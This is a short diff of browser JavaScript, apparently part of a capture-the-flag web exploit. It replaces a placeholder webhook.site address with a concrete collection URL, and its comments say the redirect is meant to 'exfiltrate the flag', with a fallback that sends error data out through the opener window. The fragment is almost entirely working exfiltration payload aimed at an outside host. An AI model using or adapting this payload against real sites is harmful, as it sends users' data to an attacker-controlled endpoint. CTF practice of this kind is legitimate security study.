@@ -9,10 +9,10 @@
       setTimeout(() => {
         try {
           // Redirect the new window to exfiltrate the flag
-          win.location = "https://webhook.site/YOUR-UNIQUE-ID";
+          win.location = "https://webhook.site/b9df327a-7a64-4657-a079-8b71dbe1cf29";
         } catch (e) {
           // If it fails, fallback: exfiltrate via opener
-          window.location = "https://webhook.site/YOUR-UNIQUE-ID?error=" + encodeURIComponent(e.message);
+          window.location = "https://webhook.site/b9df327a-7a64-4657-a079-8b71dbe1cf29?error=" + encodeURIComponent(e.message);
         }
       }, 2000);
     </script>
